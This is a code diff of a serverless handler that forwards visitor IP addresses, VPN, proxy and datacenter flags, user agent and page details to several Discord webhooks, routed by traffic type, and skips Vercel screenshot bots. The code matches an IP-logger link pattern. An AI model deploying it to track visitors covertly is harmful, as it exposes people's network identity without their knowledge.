@@ -1,25 +1,37 @@
 export default async function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).json({ error: "Method not allowed" });
-  }
+  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });
 
   try {
-    const webhookUrl = process.env.WEBHOOK_LINK;
-    if (!webhookUrl) {
-      return res.status(500).json({ error: "WEBHOOK_LINK not configured" });
+    const hooks = {
+      all: process.env.WEBHOOK_ALL,
+      vpn: process.env.WEBHOOK_VPN,
+      database: process.env.WEBHOOK_DATABASE,
+      real: process.env.WEBHOOK_REAL,
+    };
+
+    if (!hooks.all && !hooks.vpn && !hooks.database && !hooks.real) {
+      return res.status(500).json({ error: "No webhooks configured" });
     }
 
     const b = req.body || {};
+    const ua = String(b.userAgent || "");
+
+    // Optional: block Vercel screenshot bots also on backend
+    if (ua.toLowerCase().includes("vercel-screenshot")) {
+      return res.status(200).json({ ok: true, skipped: "vercel-screenshot" });
+    }
 
     const clip = (v, n) => {
       const s = (v === null || v === undefined) ? "" : String(v);
       return s.length > n ? s.slice(0, n - 1) + "…" : s;
     };
-
     const boolStr = (v) => (v === true ? "true" : v === false ? "false" : String(v));
 
-    // Discord embed limits: field value max 1024 chars, total embed size ~6000
-    // Keep fields compact & clipped.
+    const isVpn = b.vpn === true;
+    const isProxy = b.proxy === true;
+    const isDc = b.datacenter === true;
+
+    // Build the same “full info” embed
     const ipLine = [
       `IP: ${clip(b.ip || "unknown", 80)}`,
       `VPN: ${boolStr(b.vpn)}`,
@@ -74,7 +86,7 @@ export default async function handler(req, res) {
 
     const embed = {
       title: "Page Access Logged",
-      color: (b.vpn === true || b.proxy === true) ? 0xff0000 : (b.datacenter === true ? 0xffa500 : 	0x008000),
+      color: (isVpn || isProxy) ? 0xff0000 : (isDc ? 0xffa500 : 0x008000),
       fields: [
         { name: "IP / Flags", value: clip(ipLine || "n/a", 1024), inline: false },
         { name: "Page", value: clip(pageLine || "n/a", 1024), inline: false },
@@ -84,18 +96,37 @@ export default async function handler(req, res) {
         { name: "Time", value: clip(timeLine || "n/a", 1024), inline: false }
       ]
     };
-
     if (note) embed.fields.push({ name: "Note", value: clip(note, 1024), inline: false });
 
-    await fetch(webhookUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ embeds: [embed] })
-    });
+    // Decide where to send
+    const destinations = [];
 
-    return res.status(200).json({ ok: true });
+    // 1) ALL: always
+    if (hooks.all) destinations.push(hooks.all);
+
+    // 2) VPN: vpn/proxy only
+    if (hooks.vpn && (isVpn || isProxy)) destinations.push(hooks.vpn);
+
+    // 3) DATABASE: choose your rule (example: datacenter OR vpn/proxy)
+    if (hooks.database && (isDc || isVpn || isProxy)) destinations.push(hooks.database);
+
+    // 4) REAL: only clean traffic (no vpn/proxy/datacenter)
+    if (hooks.real && !(isVpn || isProxy || isDc)) destinations.push(hooks.real);
+
+    // Send (dedupe)
+    const unique = [...new Set(destinations)];
+
+    await Promise.all(unique.map((url) =>
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+      })
+    ));
+
+    return res.status(200).json({ ok: true, sent: unique.length });
   } catch (err) {
-    console.error("log-vpn backend error:", err);
+    console.error("multi-webhook backend error:", err);
     return res.status(500).json({ error: "Internal server error" });
   }
 }
